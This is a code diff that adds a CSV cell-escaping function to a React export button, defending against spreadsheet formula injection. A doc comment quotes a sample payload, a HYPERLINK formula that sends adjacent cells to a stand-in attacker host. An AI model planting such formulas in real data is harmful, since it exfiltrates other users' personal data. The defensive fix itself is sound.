@@ -3,6 +3,50 @@
 import React, { useCallback, useState } from 'react'
 import { useAupT } from '../../utils/useTranslation.js'
 
+/**
+ * Characters that make a spreadsheet read a cell as a formula rather than text.
+ * `\t` and `\r` are in the list because Excel strips leading whitespace before
+ * deciding.
+ */
+const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/
+
+/**
+ * A plain number, which `-` would otherwise send through the neutraliser.
+ *
+ * `-12.5` is not a formula, and prefixing it with an apostrophe turns a numeric
+ * column into text: the spreadsheet stops summing it, sorts it as a string and
+ * flags every cell. Amounts, deltas and temperatures are ordinary export
+ * content, so the exemption has to exist — and it is free, because no formula
+ * matches an anchored number.
+ */
+const PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)?$/
+
+/**
+ * Escape one CSV cell.
+ *
+ * Two jobs, and the second one was missing. Collections fed from the outside —
+ * a contact form, a signup, a ticket — let an anonymous visitor store
+ * `=HYPERLINK("https://attacker.tld/?d="&A2&B2,"Click")` as their name. The old
+ * escape only quoted on `,`, `"` or `\n`, none of which a formula contains, so
+ * the value reached the file bare and Excel or LibreOffice evaluated it in the
+ * administrator's session — exfiltrating neighbouring cells, i.e. the personal
+ * data of every other exported row.
+ *
+ * A leading apostrophe is the standard neutraliser: the cell displays as text.
+ * `\r` also joins the quoting condition — alone it was breaking the line split.
+ */
+export function escapeCsvCell(val: unknown): string {
+  if (val === null || val === undefined) return ''
+  let str = String(val)
+
+  if (CSV_FORMULA_PREFIX.test(str) && !PLAIN_NUMBER.test(str)) str = `'${str}`
+
+  if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
+    return `"${str.replace(/"/g, '""')}"`
+  }
+  return str
+}
+
 interface ExportButtonProps {
   collection: string
   totalDocs: number
@@ -47,14 +91,7 @@ export const ExportButton: React.FC<ExportButtonProps> = ({ collection, totalDoc
         })
 
       // Generate CSV
-      const escape = (val: unknown): string => {
-        if (val === null || val === undefined) return ''
-        const str = String(val)
-        if (str.includes(',') || str.includes('"') || str.includes('\n')) {
-          return `"${str.replace(/"/g, '""')}"`
-        }
-        return str
-      }
+      const escape = escapeCsvCell
 
       const header = columns.map(escape).join(',')
       const rows = allDocs.map((doc) =>
